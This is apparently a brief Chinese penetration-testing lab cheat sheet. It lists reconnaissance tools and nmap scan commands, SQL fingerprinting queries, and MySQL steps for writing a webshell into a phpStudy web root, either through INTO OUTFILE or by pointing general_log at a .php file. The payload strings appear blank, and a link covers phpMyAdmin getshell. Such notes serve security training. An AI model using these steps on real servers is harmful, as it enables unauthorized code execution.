# 实战靶场

## 信息收集
获取SQL权限后

常用命令

google hack

子域名枚举

shodan

dns信息

nmap

nmap -sP 192.168.145.* 扫网段

nmap -sS -sV -Pn 192.168.145.135 扫主机

whatweb

wappalyzer

nkito

dirbuster

gobuster

ffub

+ 常用sql
 - SELECT @@version; -- (SQL Server) or SELECT version(); -- (MySQL, PostgreSQL)
 - SELECT user(); -- or a variant like CURRENT_USER, SYSTEM_USER
 - SELECT @@basedir;
+ into outfile导出木马
 - SELECT '' INTO OUTFILE 'c:\\phpStudy\\www\\xxx2.php';
 - show global variables like '%secure%';
 - 上面into outfile 可执行的前提是secure_file_priv 不为null（没有具体值也可以写入），若null，需要在Mysql文件夹下修改`my.ini` 文件，在[mysqld]内加入`secure_file_priv =""`
+ MySQL 日志导入木马
 - SHOW VARIABLES like '%general%';

| Variable_name | Value |
| --- | --- |
| general_log | OFF |
| general_log_file | C:\phpStudy\MySQL\data\stu1.log |

 - SET GLOBAL general_log = 'ON';
 - SET GLOBAL general_log_file = 'c:\\phpStudy\\www\\log.php';
 - SELECT "";
+ phpMyadmin getshell [https://bwshen.blog.csdn.net/article/details/99108699](https://bwshen.blog.csdn.net/article/details/99108699)
